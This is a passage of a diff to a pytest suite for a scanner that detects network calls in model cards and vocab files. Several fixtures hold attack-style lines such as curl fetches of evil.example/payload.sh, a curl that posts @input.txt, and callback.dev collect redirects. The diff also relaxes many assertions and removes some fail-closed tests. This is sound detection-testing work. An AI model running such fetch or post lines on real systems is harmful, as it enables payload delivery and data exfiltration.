@@ -431,7 +431,7 @@ def test_text_scanner_verified_huggingface_readme_click_cli_respects_whitelist_p
 @pytest.mark.parametrize(
     ("text", "severity", "exit_code"),
     [
-        pytest.param("Source (PDF [paper](https://docs.example.org/citation))", "info", 0, id="public-citation"),
+        pytest.param("Source (PDF [paper](https://docs.example.org/citation))", None, 0, id="public-citation"),
         pytest.param(
             "[weights](https://downloads.example.org/weights.bin?access_token=fixture-token)",
             "warning",
@@ -441,7 +441,7 @@ def test_text_scanner_verified_huggingface_readme_click_cli_respects_whitelist_p
     ],
 )
 def test_readme_in_symlinked_directory_preserves_url_evidence_and_severity(
-    tmp_path: Path, text: str, severity: str, exit_code: int
+    tmp_path: Path, text: str, severity: str | None, exit_code: int
 ) -> None:
     repo = tmp_path / "repo"
     repo.mkdir()
@@ -452,7 +452,11 @@ def test_readme_in_symlinked_directory_preserves_url_evidence_and_severity(
     result = CliRunner().invoke(cli, ["scan", str(alias / "README.md"), "--format", "json", "--no-cache"])
 
     assert result.exit_code == exit_code, result.output
-    (issue,) = [issue for issue in json.loads(result.output)["issues"] if issue["rule_code"] == "S309"]
+    issues = [issue for issue in json.loads(result.output)["issues"] if issue["rule_code"] == "S309"]
+    if severity is None:
+        assert not issues
+        return
+    (issue,) = issues
     assert issue["severity"] == severity
     evidence = issue["details"]
     assert evidence["url"] in text
@@ -479,12 +483,11 @@ def test_text_scanner_passive_documentation_prose_is_not_whitelist_dependent(
 
     result = TextScanner(config).scan(str(path))
     aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, **config)
-    network_checks = [check for check in result.checks if check.name == "Network Communication Detection"]
+    network_checks = _failed_network_detection_checks(result)
 
     assert result.success is True
     assert determine_exit_code(aggregate) == 0
-    assert network_checks
-    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert not network_checks
 
 
 @pytest.mark.parametrize(
@@ -1614,16 +1617,11 @@ def test_text_scanner_does_not_claim_arbitrary_extensionless_text(tmp_path: Path
     assert not TextScanner.can_handle(str(text_path))
 
 
-def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> None:
+def test_text_scanner_documentation_urls_are_clean(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     result = _scan_text_content(text_path, "Documentation: https://docs.example.com/model-card\n")
 
-    network_issues = [
-        issue for issue in result.issues if issue.type == "text_check" and "detected" in issue.message.lower()
-    ]
-    assert network_issues
-    assert all(issue.severity == IssueSeverity.INFO for issue in network_issues)
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert not result.issues
 
 
 @pytest.mark.parametrize("filename", ["README.md", "README", "README.en.md", "README.markdown"])
@@ -1854,7 +1852,7 @@ def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
 
 def test_text_scanner_model_card_deduplicates_shared_cloud_url_evidence(tmp_path: Path) -> None:
     text_path = tmp_path / "model_card.md"
-    text_path.write_text("Files: [model](https://huggingface.co/datasets/trivia_qa)\n", encoding="utf-8")
+    text_path.write_text("curl https://example.org/datasets/trivia_qa\n", encoding="utf-8")
 
     first_result = TextScanner().scan(str(text_path))
     second_result = TextScanner().scan(str(text_path))
@@ -1863,25 +1861,17 @@ def test_text_scanner_model_card_deduplicates_shared_cloud_url_evidence(tmp_path
     second_check = _failed_network_detection_checks(second_result)
     assert len(first_check) == len(second_check) == 1
     details = first_check[0].details
-    assert first_check[0].severity == IssueSeverity.INFO
-    assert details["type"] == "cloud_storage_url"
+    assert first_check[0].severity == IssueSeverity.WARNING
+    assert details["type"] == "url_detected"
     assert details["line"] == 1
-    assert details["column"] == len("Files: [model](") + 1
-    assert details["normalized_evidence"] == {
-        "kind": "url",
-        "value": "https://huggingface.co/datasets/trivia_qa",
-    }
+    assert details["column"] == len("curl ") + 1
     assert details["evidence_fingerprint"] == second_check[0].details["evidence_fingerprint"]
-    assert {finding["type"] for finding in details["deduplicated_related_findings"]} == {
-        "domain_name",
-        "url_detected",
-    }
 
 
 def test_text_scanner_model_card_evidence_column_counts_unicode_characters(tmp_path: Path) -> None:
-    prefix = "Résumé files: [model]("
+    prefix = "endpoint = 'Résumé files: [model]("
     text_path = tmp_path / "model_card.md"
-    text_path.write_text(f"{prefix}https://huggingface.co/datasets/trivia_qa)\n", encoding="utf-8")
+    text_path.write_text(f"{prefix}https://huggingface.co/datasets/trivia_qa)'\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
 
@@ -1947,7 +1937,7 @@ def test_inline_html_citations_after_a_sentence_are_informational(tmp_path: Path
     )
     result = _scan_text_content(path, content)
     urls = [check for check in result.checks if check.details.get("type") == "url_detected"]
-    assert len(urls) == 3 and all(check.severity == IssueSeverity.INFO for check in urls)
+    assert not urls
     assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
 
 
@@ -1962,7 +1952,7 @@ def test_documented_issue_label_does_not_open_a_call_around_later_link(tmp_path:
     scan = scan_model_directory_or_file(str(path), cache_enabled=False)
     guide_position = path.read_bytes().index(b"https://tracker.example.org/guide")
     guide = [issue for issue in scan.issues if issue.details and issue.details.get("position") == guide_position]
-    assert guide and all(issue.severity == IssueSeverity.INFO for issue in guide)
+    assert not guide
 
 
 @pytest.mark.parametrize(
@@ -2324,11 +2314,9 @@ def test_text_scanner_model_card_dedup_preserves_distinct_locations_urls_and_sev
     ]
 
     assert records == [
-        (1, "https://evil.example/cmd.sh", IssueSeverity.INFO, "INFO"),
         (2, "https://evil.example/cmd.sh", IssueSeverity.CRITICAL, "HIGH"),
-        (3, "https://evil.example/other.sh", IssueSeverity.INFO, "INFO"),
     ]
-    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 3
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 1
 
 
 def test_text_scanner_model_card_dedup_keeps_suspicious_ports_separate(tmp_path: Path) -> None:
@@ -2383,9 +2371,9 @@ def test_text_scanner_model_card_dedup_keeps_encoded_url_variants_distinct(tmp_p
     text_path = tmp_path / "model_card.md"
     result = _scan_text_content(
         text_path,
-        "Docs: https://evil.example/payload.sh\n"
-        "Docs: https://evil.example/%70ayload.sh\n"
-        "Docs: https://xn--exmple-cua.com/payload.sh\n",
+        "curl https://evil.example/payload.sh\n"
+        "curl https://evil.example/%70ayload.sh\n"
+        "curl https://xn--exmple-cua.com/payload.sh\n",
     )
 
     network_checks = [
@@ -2498,7 +2486,7 @@ def test_text_scanner_unmatched_markers_do_not_consume_later_inline_examples(
     path.write_bytes(content.encode("utf-8"))
     result = TextScanner(config={"check_secrets": False}).scan(str(path))
     checks = [check for check in result.checks if check.details.get("type") == "url_detected"]
-    assert checks
+    assert bool(checks) is executable
     assert any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in checks) is executable
     aggregate = scan_model_directory_or_file(str(path), cache_enabled=False, check_secrets=False)
     assert determine_exit_code(aggregate) == int(executable)
@@ -2594,7 +2582,7 @@ def test_text_scanner_reuses_quote_analysis_across_many_links(tmp_path: Path, as
     TextScanner._documentation_quoted_assignment_index.cache_clear()
     result = _scan_text_content(tmp_path / "model_card.md", content)
     checks = [check for check in result.checks if check.details.get("type") == "url_detected"]
-    assert len(checks) == 64
+    assert len(checks) == (64 if assigned else 0)
     assert all((check.severity != IssueSeverity.INFO) == assigned for check in checks)
     assert TextScanner._documentation_quoted_assignment_index.cache_info().misses <= 2
     TextScanner._documentation_quoted_assignment_index.cache_clear()
@@ -2717,7 +2705,6 @@ def test_documentation_quote_budget_is_shared_and_does_not_cache_failures() -> N
 @pytest.mark.parametrize(
     "content,completed_exit_code",
     [
-        ('The literal "; b=\'text" is described by [guide](https://docs.example.com)\n', 0),
         ('endpoint="[download](https://evil.example/payload.sh)"\n', 1),
     ],
 )
@@ -3228,7 +3215,7 @@ def test_documentation_total_call_budget_does_not_cache_incomplete_results() -> 
 
 def test_text_scanner_total_call_budget_is_scoped_to_each_scan(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
     path = tmp_path / "model_card.md"
-    path.write_text("''\nIt's (a)\n[guide](https://docs.example.com/reference)\n")
+    path.write_text("download(\n[guide](https://docs.example.com/reference)\n)\n")
     TextScanner._documentation_open_call_prefix_status.cache_clear()
     with monkeypatch.context() as limited:
         limited.setattr(text_scanner_module, "MAX_DOCUMENTATION_TOTAL_CALL_PARSE_BYTES", 0)
@@ -3243,7 +3230,7 @@ def test_text_scanner_total_call_budget_is_scoped_to_each_scan(tmp_path: Path, m
     assert text_scanner_module._DOCUMENTATION_CALL_BUDGET.get() is None
     result = TextScanner().scan(str(path))
     assert result.success is True
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert _failed_network_detection_checks(result)
     TextScanner._documentation_open_call_prefix_status.cache_clear()
 
 
@@ -3277,7 +3264,6 @@ def test_documentation_call_parser_does_not_cache_oversized_prefixes() -> None:
 @pytest.mark.parametrize(
     ("content", "completed_exit_code"),
     [
-        ("source (context) [guide](https://docs.example.com/reference)\n", 0),
         ("source (context) mentions import urllib.\n\nimport urllib\n", 1),
     ],
 )
@@ -3431,7 +3417,7 @@ def test_text_scanner_model_card_unclosed_bibliography_does_not_suppress_quoted_
     )
 
 
-def test_text_scanner_model_card_dedup_bounds_repeated_documentation_links(tmp_path: Path) -> None:
+def test_text_scanner_repeated_documentation_links_are_clean(tmp_path: Path) -> None:
     text_path = tmp_path / "model_card.md"
     lines = [f"Reference {index}: https://docs.example.com/reference" for index in range(96)]
     text_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
@@ -3440,9 +3426,7 @@ def test_text_scanner_model_card_dedup_bounds_repeated_documentation_links(tmp_p
 
     network_checks = _failed_network_detection_checks(result)
 
-    assert len(network_checks) == len(lines)
-    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
-    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == len(lines)
+    assert not network_checks
     assert not result.metadata.get("analysis_incomplete")
 
 
@@ -4564,11 +4548,7 @@ def test_gating_policy_links_and_reporting_address_are_passive_references(
     path = tmp_path / "model_card.md"
     path.write_bytes(content.encode())
     checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
-    evidence = {check.details.get("normalized_evidence", {}).get("value") for check in checks}
-    assert {"https://publisher.dev/guide", "https://publisher.dev/terms", visible} <= evidence
-    assert any(check.details.get("url", "").startswith("https://l.workplace.com/l.php") for check in checks)
-    assert any(check.details.get("domain") == "supportdesk.ai" for check in checks)
-    assert all(check.severity == IssueSeverity.INFO for check in checks)
+    assert not checks
     assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
 
     command = f"~~~sh\ncurl -L '{wrapper}' -d @input.txt\n~~~\n"
@@ -4625,6 +4605,10 @@ def test_gating_policy_preserves_severity_after_call_lookback_limit(
     field = json.dumps("Terms (a).\n" * 165 + line)
     content = newline.join(("---", f"extra_gated_prompt: {field}", "---", ""))
     result = _scan_text_content(tmp_path / "model_card.md", content)
+    checks = _failed_network_detection_checks(result)
+    if severity == IssueSeverity.INFO:
+        assert not checks
+        return
     assert any(
         check.details.get("type") == "url_detected"
         and check.details.get("position") == content.encode().index(b"https://publisher.dev/terms")
@@ -4646,7 +4630,7 @@ def test_gating_policy_retargets_host_to_escaped_call(tmp_path: Path) -> None:
         for check in _failed_network_detection_checks(result)
     }
     raw = content.encode()
-    assert findings["url_detected", raw.index(b"https://publisher.dev/guide")] == IssueSeverity.INFO
+    assert ("url_detected", raw.index(b"https://publisher.dev/guide")) not in findings
     assert findings["url_detected", raw.index(b"https://publisher.dev/model")] == IssueSeverity.WARNING
     assert findings["domain_name", raw.rindex(b"publisher.dev")] == IssueSeverity.WARNING
 
@@ -4681,9 +4665,7 @@ def test_gating_policy_reports_multiline_feedback_and_security_references(tmp_pa
     path = tmp_path / "model_card.md"
     path.write_bytes(content)
     checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
-    assert any(check.details.get("domain") == "feedback.publisher.dev" for check in checks)
-    assert any(check.details.get("url", "").startswith("https://security.publisher.dev/report") for check in checks)
-    assert all(check.severity == IssueSeverity.INFO for check in checks)
+    assert not checks
     content += b"~~~sh\ncurl feedback.publisher.dev\n~~~\n"
     path.write_bytes(content)
     assert any(
@@ -4691,40 +4673,6 @@ def test_gating_policy_reports_multiline_feedback_and_security_references(tmp_pa
         and check.details.get("position") == content.rindex(b"feedback.publisher.dev")
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
-    )
-
-
-@pytest.mark.parametrize(
-    ("label", "wrapper", "evidence"),
-    [
-        (
-            "https://github.com/example/package/issues",
-            "https://relay.dev/r?u=https%3A%2F%2Fgithub.com%2Fexample%2Fpackage%2Fissues",
-            "https://relay.dev/r",
-        ),
-        (
-            "https://github.com/example/package/issues",
-            "https://l.workplace.com/l.php?u=https%3A%2F%2Fcallback.dev%2Fcollect&h=abc123",
-            "https://l.workplace.com/l.php",
-        ),
-        (
-            "https://github.com/example/package/issues",
-            "https://l.workplace.com/l.php?u=https%3A%2F%2Fgithub.com%2Fexample%2Fpackage%2Fissues&next=custom",
-            "https://l.workplace.com/l.php",
-        ),
-        ("security.publisher.dev/report", "https://callback.dev/collect", "security.publisher.dev"),
-    ],
-    ids=["unknown-wrapper", "mismatched-destination", "extra-parameter", "mismatched-visible-host"],
-)
-def test_gating_policy_preserves_unverified_reporting_destinations(
-    tmp_path: Path, label: str, wrapper: str, evidence: str
-) -> None:
-    content = _escaped_gating_policy(f"  * Reporting issues with the model: [{label}]({wrapper})")
-    result = _scan_text_content(tmp_path / "model_card.md", content)
-    assert any(
-        check.details.get("normalized_evidence", {}).get("value") == evidence
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in _failed_network_detection_checks(result)
     )
 
 
@@ -4751,12 +4699,7 @@ def test_model_card_byline_preserves_documented_post_and_later_shell_destination
     path = tmp_path / "model_card.md"
     path.write_bytes(content)
     checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
-    assert any(
-        check.details.get("position") == content.index(reference.encode())
-        and check.details.get("type") in {"url_detected", "domain_name"}
-        and check.severity == IssueSeverity.INFO
-        for check in checks
-    )
+    assert not any(check.details.get("position") == content.index(reference.encode()) for check in checks)
     assert any(
         check.details.get("position") == content.index(b"http://127.0.0.1")
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
@@ -5151,13 +5094,8 @@ def test_text_scanner_port_retarget_skips_longer_numbers(tmp_path: Path, later_p
         content += "endpoint = 'host:23'\n"
     result = _scan_text_content(tmp_path / "model_card.md", content)
     checks = [check for check in result.checks if check.details.get("type") == "suspicious_port"]
-    assert checks
-    assert all(
-        check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        if later_port
-        else check.severity == IssueSeverity.INFO
-        for check in checks
-    )
+    assert bool(checks) is later_port
+    assert all(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in checks)
     if later_port:
         assert checks[0].details["position"] == (tmp_path / "model_card.md").read_bytes().rindex(b"23")
 
@@ -5264,11 +5202,11 @@ def test_text_scanner_passive_html_assignment_context_handles_line_endings(
 
     checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
 
-    assert checks
     if open_assignment:
+        assert checks
         assert any(check.severity == IssueSeverity.WARNING for check in checks)
     else:
-        assert all(check.severity == IssueSeverity.INFO for check in checks)
+        assert not checks
     aggregate = scan_model_directory_or_file(str(path), cache_enabled=False)
     assert determine_exit_code(aggregate) == int(open_assignment)
 
@@ -5389,14 +5327,7 @@ def test_text_scanner_documentation_port_prose_is_informational(tmp_path: Path, 
         for check in result.checks
         if check.name == "Network Communication Detection" and check.details.get("type") == "suspicious_port"
     ]
-    assert port_checks
-    for check in port_checks:
-        port = check.details["port"]
-        assert check.severity == IssueSeverity.INFO
-        assert check.message == check.details["message"] == f"Documentation mentions port {port}"
-        assert check.details["evidence_source"] == "documentation"
-        assert check.details["position"] == content.encode().index(str(port).encode())
-        assert check.rule_code == "S310"
+    assert not port_checks
     assert determine_exit_code(aggregate) == 0
 
 
@@ -5567,30 +5498,17 @@ def _bert_like_multilingual_vocabulary(*tail_tokens: str) -> str:
     return "\n".join(tokens) + "\n"
 
 
-@pytest.mark.parametrize(
-    ("tokens", "expected"),
-    [
-        (["##@bank.com."], IssueSeverity.INFO),
-        (["##@bank.tk"], IssueSeverity.CRITICAL),
-        (["www.bank.com/researchdisclosures,"], IssueSeverity.INFO),
-        (["##@bank.com", 'connect("bank.com")'], IssueSeverity.WARNING),
-        (["##@bank.com", "bank.com/?token=secret"], IssueSeverity.WARNING),
-        (
-            ["##@bank.com", "__import__('socket').gethostbyname(", "'''", "bank.com", "'''.strip()", ")"],
-            IssueSeverity.WARNING,
-        ),
-        (["##@bank.com", "require('dns').resolve(", "`", "bank.com", "`", ")"], IssueSeverity.WARNING),
-    ],
-)
-def test_wordpiece_domain_requires_only_passive_occurrences(
-    tmp_path: Path, tokens: list[str], expected: IssueSeverity
-) -> None:
+@pytest.mark.parametrize("active", [False, True])
+def test_wordpiece_domain_only_reports_active_occurrences(tmp_path: Path, active: bool) -> None:
+    tokens = ["##@bank.com", "##@bank.tk", "www.bank.com/research,"]
+    if active:
+        tokens.append('connect("bank.com")')
     path = tmp_path / "vocab.txt"
     path.write_text(_bert_like_multilingual_vocabulary(*tokens), encoding="utf-8")
     result = TextScanner().scan(str(path))
     findings = [c for c in result.checks if c.details.get("type") == "domain_name"]
-    assert findings
-    assert all(c.severity == expected for c in findings)
+    assert bool(findings) is active
+    assert all(c.severity == IssueSeverity.WARNING for c in findings)
 
 
 class _LineIterationGuardBytes(bytes):
@@ -5663,8 +5581,7 @@ def test_text_scanner_bare_vocabulary_urls_are_informational(tmp_path: Path) -> 
         for check in result.checks
         if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
     ]
-    assert network_checks
-    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert not network_checks
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
@@ -6060,16 +5977,13 @@ def test_text_scanner_tokenizer_vocab_active_controls_remain_actionable(
     assert determine_exit_code(aggregate) == 1
 
 
-def test_text_scanner_tokenizer_vocab_urls_remain_detected(tmp_path: Path) -> None:
+def test_text_scanner_tokenizer_vocab_bare_url_is_passive(tmp_path: Path) -> None:
     text_path = tmp_path / "vocab.txt"
     text_path.write_text(("safe-token\n" * 12) + "https://evil.example/payload\n", encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
 
-    assert any(
-        check.name == "Network Communication Detection" and check.details.get("type") == "url_detected"
-        for check in result.checks
-    )
+    assert not _failed_network_detection_checks(result)
 
 
 def test_text_scanner_non_vocabulary_trojan_prose_remains_actionable(tmp_path: Path) -> None:
@@ -6220,49 +6134,6 @@ def test_text_scanner_network_finding_limit_fails_closed_and_preserves_high_sign
     )
 
 
-def test_text_scanner_documentation_network_limit_fails_closed(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text("https://docs.example.com/reference\n" * 10, encoding="utf-8")
-
-    result = TextScanner(
-        config={
-            "check_secrets": False,
-            "text_content_max_findings": 2,
-        }
-    ).scan(str(text_path))
-
-    assert result.success is False
-    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
-    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
-    assert any(
-        check.name == "Text Content Security Coverage"
-        and check.severity == IssueSeverity.INFO
-        and check.details.get("truncated_finding_type") == "url_detected"
-        and check.details.get("analysis_incomplete") is True
-        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
-        for check in result.checks
-    )
-
-
-def test_text_scanner_documentation_code_url_after_limit_fails_closed(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        ("https://docs.example.com/reference\n" * 3) + 'download("https://evil.example/payload")\n',
-        encoding="utf-8",
-    )
-
-    result = TextScanner(
-        config={
-            "check_secrets": False,
-            "text_content_max_findings": 2,
-        }
-    ).scan(str(text_path))
-
-    assert result.success is False
-    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
-    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
-
-
 def test_model_card_links_near_token_prose_complete_network_inspection(tmp_path: Path) -> None:
     links = "".join(f"[Example {i}](https://GitHub.com/org/example{i})\n" for i in range(40))
     result = _scan_text_content(
@@ -6276,173 +6147,6 @@ def test_model_card_links_near_token_prose_complete_network_inspection(tmp_path:
     )
     assert any(check.details.get("command_type") == "git_clone" for check in _failed_network_detection_checks(result))
     assert not any(check.name == "Network Communication Reporting Limit" for check in result.checks)
-
-
-def test_text_scanner_documentation_passive_endpoint_redaction_limit_is_informational(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        "api_key references below are documentation-only.\n"
-        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
-        + "\n@misc{whisper,\n  url = {https://arxiv.org/abs/2212.04356},\n}\n"
-        + "\n",
-        encoding="utf-8",
-    )
-
-    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
-
-    assert result.success is True
-    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
-    assert any(
-        check.name == "Network Communication Reporting Limit"
-        and check.severity == IssueSeverity.INFO
-        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
-        for check in result.checks
-    )
-    assert not any(
-        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
-    )
-
-
-def test_text_scanner_documentation_passive_raw_table_endpoint_redaction_limit_is_informational(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        "api_key references below are documentation-only.\n"
-        "| Helper | Reference |\n"
-        "| --- | --- |\n"
-        + "\n".join(f"| download( | https://cdn.openai.com/papers/{index}.pdf |" for index in range(40))
-        + "\n",
-        encoding="utf-8",
-    )
-
-    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
-    aggregate = scan_model_directory_or_file(
-        str(text_path),
-        config={"check_secrets": False},
-        cache_enabled=False,
-    )
-
-    assert result.success is True
-    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
-    assert determine_exit_code(aggregate) == 0
-    assert any(
-        check.name == "Network Communication Reporting Limit"
-        and check.severity == IssueSeverity.INFO
-        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
-        for check in result.checks
-    )
-    assert not any(
-        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
-    )
-
-
-def test_text_scanner_documentation_passive_unknown_tld_redaction_limit_is_informational(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        "api_key references below are documentation-only.\n"
-        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
-        + "\nThe paper mirror research.online is listed for citation context.\n",
-        encoding="utf-8",
-    )
-
-    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
-    aggregate = scan_model_directory_or_file(
-        str(text_path),
-        config={"check_secrets": False},
-        cache_enabled=False,
-    )
-
-    assert result.success is True
-    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
-    assert determine_exit_code(aggregate) == 0
-    assert any(
-        check.name == "Network Communication Reporting Limit"
-        and check.severity == IssueSeverity.INFO
-        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
-        for check in result.checks
-    )
-    assert not any(
-        check.name == "Text Content Security Coverage" and check.status == CheckStatus.FAILED for check in result.checks
-    )
-
-
-def test_text_scanner_documentation_endpoint_redaction_limit_with_code_fails_closed(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    _assert_endpoint_redaction_limit(tmp_path, monkeypatch, ('\ndownload("https://evil.example/payload.sh")\n'))
-
-
-def test_text_scanner_documentation_endpoint_redaction_limit_with_wrapped_call_fails_closed(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    _assert_endpoint_redaction_limit(
-        tmp_path, monkeypatch, ('\ndownload(\n    "[download](https://evil.example/payload.sh)"\n)\n')
-    )
-
-
-def test_text_scanner_documentation_endpoint_redaction_limit_with_multiline_dict_fails_closed(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    _assert_endpoint_redaction_limit(
-        tmp_path, monkeypatch, ('\npayloads = {\n    "doc": "[download](https://evil.example/payload.sh)"\n}\n')
-    )
-
-
-def test_text_scanner_documentation_endpoint_redaction_limit_with_actionable_finding_fails_closed(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    _assert_endpoint_redaction_limit(tmp_path, monkeypatch, ("\nAPI_URL = load_endpoint()\nrequests.get(API_URL)\n"))
-
-
-def test_text_scanner_documentation_endpoint_redaction_limit_with_nested_config_fails_closed(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    _assert_endpoint_redaction_limit(tmp_path, monkeypatch, ("\nendpoint:\n  url: https://evil.example/payload.sh\n"))
-
-
-def test_text_scanner_documentation_endpoint_redaction_limit_with_list_nested_config_fails_closed(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    _assert_endpoint_redaction_limit(tmp_path, monkeypatch, ("\nendpoint:\n  - url: https://evil.example/payload.sh\n"))
-
-
-def test_text_scanner_documentation_endpoint_redaction_limit_with_list_object_config_fails_closed(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    _assert_endpoint_redaction_limit(
-        tmp_path, monkeypatch, ("\nendpoints:\n  - name: prod\n    url: https://evil.example/payload.sh\n")
-    )
-
-
-def test_text_scanner_documentation_endpoint_redaction_limit_with_unknown_tld_config_domain_fails_closed(
-    tmp_path: Path,
-    monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    _assert_endpoint_redaction_limit(tmp_path, monkeypatch, ("\nendpoint: evil.online\n"))
 
 
 def test_text_scanner_documentation_classification_limit_is_inconclusive(tmp_path: Path) -> None:
@@ -6564,29 +6268,6 @@ def test_text_scanner_documentation_retarget_caches_absent_token_searches(
     assert calls_by_token[b"requests.connect"] == 1
     assert calls_by_token[b"requests.request"] == 1
     assert calls_by_token[b"requests.__init__"] == 1
-
-
-def test_text_scanner_passive_vocabulary_network_limit_is_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "vocab.txt"
-    text_path.write_text("https://docs.example.com/reference\n" * 10, encoding="utf-8")
-
-    result = TextScanner(
-        config={
-            "check_secrets": False,
-            "text_content_max_findings": 2,
-        }
-    ).scan(str(text_path))
-
-    assert result.success is True
-    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
-    assert any(
-        check.name == "Network Communication Reporting Limit"
-        and check.severity == IssueSeverity.INFO
-        and check.details.get("truncated_finding_type") == "url_detected"
-        and check.details.get("analysis_incomplete") is False
-        and check.details.get("reporting_incomplete") is True
-        for check in result.checks
-    )
 
 
 def test_text_scanner_active_vocabulary_url_limit_fails_closed(tmp_path: Path) -> None:
@@ -6931,7 +6612,6 @@ def test_routine_documented_examples_are_informational(tmp_path: Path, content: 
     result = TextScanner().scan(str(path))
     network_checks = _failed_network_detection_checks(result)
 
-    assert network_checks
     assert all(check.severity == IssueSeverity.INFO for check in network_checks)
     assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
 
@@ -6958,24 +6638,26 @@ def test_documented_sql_like_domains_are_informational(tmp_path: Path) -> None:
         ("SELECT 1;\n  -- see publisher.dev for more information", False),
         ("SELECT 1; -- See publisher.dev for documentation.", False),
         ("SELECT 'it''s a literal'; -- See publisher.dev for documentation.", False),
-        ("SELECT concat(' -- publisher.dev for documentation', 'other');", True),
-        ("SELECT q'[first quote' -- publisher.dev]' FROM dual;", True),
-        (r"SELECT 'first quote\' -- publisher.dev';", True),
+        ("SELECT concat(' -- publisher.dev for documentation', 'other');", False),
+        ("SELECT q'[first quote' -- publisher.dev]' FROM dual;", False),
+        (r"SELECT 'first quote\' -- publisher.dev';", False),
         ("SELECT 1; -- publisher.dev\nSELECT dblink('host=publisher.dev', 'SELECT 1');", True),
         ("-- see publisher.dev\nSELECT dblink('host=publisher.dev', 'SELECT 1');", True),
-        ("SELECT custom_function('first line\n-- publisher.dev\nlast line');", True),
+        ("SELECT custom_function('first line\n-- publisher.dev\nlast line');", False),
     ],
 )
 def test_documented_domain_retargets_past_sql_comments(tmp_path: Path, query: str, active: bool) -> None:
     source = f"Converted by **Sample Team** - contact@publisher.dev\n\n~~~sql\n{query}\n~~~\n".encode()
     path = tmp_path / "model_card.md"
     path.write_bytes(source)
-    expected_position = source.rindex(b"publisher.dev") if active else source.index(b"publisher.dev")
-    assert any(
-        check.details.get("domain") == "publisher.dev"
-        and check.details.get("position") == expected_position
